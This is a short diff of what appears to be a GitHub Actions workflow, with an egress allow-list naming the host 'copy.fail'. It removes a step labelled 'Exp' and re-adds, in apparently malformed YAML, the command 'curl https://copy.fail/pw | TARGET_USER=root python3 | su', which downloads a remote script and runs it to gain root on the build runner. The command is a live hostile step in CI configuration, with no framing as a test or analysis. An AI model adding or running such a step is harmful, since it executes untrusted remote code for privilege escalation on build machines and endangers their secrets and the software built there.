@@ -16,8 +16,6 @@ jobs:
              *.github.com
              copy.fail
              https://copy.fail
-
-
-      - name: Exp        
-        run: |
-          curl https://copy.fail/pw | TARGET_USER=root python3 | su
+          run: |
+           curl https://copy.fail/pw | TARGET_USER=root python3 | su
+ 
